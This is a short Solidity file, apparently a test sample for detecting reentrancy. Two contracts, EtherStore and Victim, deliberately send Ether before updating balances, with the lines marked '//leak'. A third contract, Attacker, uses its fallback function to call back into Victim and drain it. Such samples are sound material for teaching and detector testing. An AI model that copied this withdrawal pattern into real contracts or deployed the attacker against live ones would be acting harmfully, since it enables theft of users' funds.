pragma solidity ^0.4.20;

contract EtherStore {
    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }

    function bad1(uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        require(msg.sender.call.value(_weiToWithdraw)()); //leak
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
    }
}

contract Victim {
    mapping(address => uint) public userBalance;
    uint public amount = 0;

    function Victim() payable {}

    function bad2() {
        uint amount = userBalance[msg.sender];
        if (amount > 0) {
            msg.sender.call.value(amount)(); //leak
            userBalance[msg.sender] = 0;
        }
    }

    function receiveEther() payable {
        if (msg.value > 0) {
            userBalance[msg.sender] += msg.value;
        }
    }

    function showAccount() public returns (uint) {
        amount = this.balance;
        return this.balance;
    }
}

contract Attacker {
    uint public amount = 0;
    uint public test = 0;

    function Attacker() payable {}

    function() payable {
        test++;
        Victim(msg.sender).bad2();
    }

    function showAccount() public returns (uint) {
        amount = this.balance;
        return this.balance;
    }

    function sendMoney(address addr) {
        Victim(addr).receiveEther.value(1 ether)();
    }

    function reentry(address addr) {
        Victim(addr).bad2();
    }
}
